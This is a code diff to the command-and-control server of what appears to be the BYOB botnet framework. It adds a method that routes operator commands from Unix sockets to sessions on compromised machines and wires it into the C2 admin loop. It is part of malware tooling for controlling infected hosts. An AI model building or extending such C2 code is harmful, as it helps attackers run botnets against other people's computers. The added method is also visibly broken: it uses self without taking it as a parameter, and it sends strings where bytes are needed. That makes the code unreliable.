@@ -1047,6 +1047,44 @@ class C2():
             globals()['package_handler'].terminate()
             globals()['package_handler'] = subprocess.Popen('{} -m {} {}'.format(sys.executable, http_serv_mod, port + 2), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, cwd=globals()['packages'], shell=True)
 
+
+    def process_unix(command, conn):
+        # Find the socket index
+        # Find the correct connection from that socket
+        # Call the command on that connection??
+
+        index = -1
+        for i, conn2 in self.unix_sockets.items():
+            if conn == conn2:
+                index = i
+
+        if index == -1: return 
+
+        ses = self.sessions[index]
+
+        # Run the command
+        util.display(f'command: {command}')
+        cmd, _, action  = command.partition(' ')
+        if cmd in globals()['c2'].commands and callable(globals()['c2'].commands[cmd]['method']):
+            method = globals()['c2'].commands[cmd]['method']
+            if callable(method):
+                result = method(action) if len(action) else method()
+                if result:
+                    task = {'task': cmd, 'result': result, 'session': index}
+                    conn.sendall(result.encode())
+                    globals()['c2'].database.handle_task(task)
+                else:
+                    conn.sendall("Error! Malformated return value from command! Session scheduled and ran command '" + cmd + "'but it returned a None value. Please return a string")
+            else:
+                conn.sendall("Error! Malformated method in Session! Session regiestered the method in C2.method[" + cmd + "] as callable when it, in fact, wasn't.")
+        else:
+            task = globals()['c2'].database.handle_task({'task': command, 'session': index})
+            self.send_task(task)
+            task = self.recv_task()
+            print(f"final result task: {task}")
+
+
+
     def run(self):
         """
         Run C2 server administration terminal
@@ -1066,6 +1104,11 @@ class C2():
                 self._prompt = "[{} @ %s]> ".format(os.getenv('USERNAME', os.getenv('USER', 'byob'))) % os.getcwd()
                 [ cmd_buffer, conn ] = self._get_prompt(self._prompt)
                 util.display(f"connection made in C2 loop: {cmd_buffer}, {conn}")
+
+                if conn is not None:
+                    self.process_unix(cmd_buffer, conn)                    
+                    continue
+
 
                 if not cmd_buffer and globals()['__abort']:
                     break
@@ -1238,8 +1281,6 @@ class Session(threading.Thread):
 
         """
 
-        util.display(f'conn {conn}')
-        util.display(f'command {command}')
 
         # If the connection is not on the screen and of the form "shell 1 cmd arg arg"
         if conn is not None and command is not None and len(command):
@@ -1285,7 +1326,7 @@ class Session(threading.Thread):
                     elif 'prompt' in task.get('task'):
                         self._prompt = task
                         [ command, conn ] = globals()['c2']._get_prompt(task.get('result') % int(self.id))
-                        util.display(f"command in: {command}")
+
                         cmd, _, action  = command.partition(' ')
                         if cmd in ('\n', ' ', ''):
                             continue
